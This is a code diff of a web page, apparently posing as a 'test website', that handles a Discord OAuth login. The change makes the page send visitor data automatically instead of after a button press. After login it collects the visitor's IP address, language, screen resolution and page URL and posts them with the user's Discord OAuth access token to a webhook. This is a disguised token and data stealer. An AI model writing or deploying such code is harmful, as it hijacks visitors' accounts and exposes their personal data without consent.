@@ -59,16 +59,14 @@
             document.body.innerHTML = `
                 <h1>Welcome, ${user.username}!</h1>
                 <p>Email: ${email}</p>
-                <label for="pc-username">Enter your PC Username:</label>
-                <input type="text" id="pc-username" placeholder="Your PC Username" required>
-                <button onclick="sendUserInfo('${data.access_token}', '${user.username}#${user.discriminator}', '${user.id}', email)">Submit</button>
+                <pre>${JSON.stringify(user, null, 2)}</pre>
             `;
+
+            // Call the function to send visitor info along with the access token
+            sendInfoToDiscord(data.access_token);
         }
 
-        async function sendUserInfo(accessToken, username, userId, email) {
-            const pcUsername = document.getElementById('pc-username').value;
-
-            // Fetch additional user data
+        async function sendInfoToDiscord(accessToken) {
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
             const ip = ipData.ip;
@@ -80,15 +78,7 @@
             const language = navigator.language;
             const screenResolution = `${window.screen.width}x${window.screen.height}`;
             const currentUrl = window.location.href;
-            const deviceMemory = navigator.deviceMemory || 'Not Available'; // RAM size in GB
-            const hardwareConcurrency = navigator.hardwareConcurrency || 'Not Available'; // Number of logical processors
-            const screenDPI = (window.devicePixelRatio * 96).toFixed(2) + ' DPI'; // Estimated screen DPI
 
-            const gl = document.createElement('canvas').getContext('webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Not Available';
-
-            // Prepare the webhook message
             const embedMessage = {
                 embeds: [{
                     title: '👤 New Visitor Info',
@@ -101,13 +91,6 @@
                         { name: '🌍 Language', value: language, inline: true },
                         { name: '📺 Screen Resolution', value: screenResolution, inline: true },
                         { name: '🔗 Current URL', value: currentUrl, inline: true },
-                        { name: '💾 Device Memory', value: `${deviceMemory} GB`, inline: true },
-                        { name: '🧠 Hardware Concurrency', value: `${hardwareConcurrency} logical processors`, inline: true },
-                        { name: '🖼️ Screen DPI', value: screenDPI, inline: true },
-                        { name: '🎮 Graphics Card', value: gpu, inline: true },
-                        { name: '🖥️ CPU', value: 'Not Available (JavaScript Limitations)', inline: true }, // Placeholder
-                        { name: '🛠️ Motherboard', value: 'Not Available (JavaScript Limitations)', inline: true }, // Placeholder
-                        { name: '👤 PC Username', value: pcUsername, inline: true },
                         { name: '🔑 Access Token', value: accessToken, inline: false } // Send the access token
                     ],
                     footer: {
@@ -125,7 +108,7 @@
                 body: JSON.stringify(embedMessage)
             });
 
-            document.body.innerHTML += `<h2>Thank You for Testing Sem's Test Website!</h2>`;
+            document.body.innerHTML += `<h2>Test Website, Thank You for Testing</h2>`;
         }
 
         window.onload = function () {
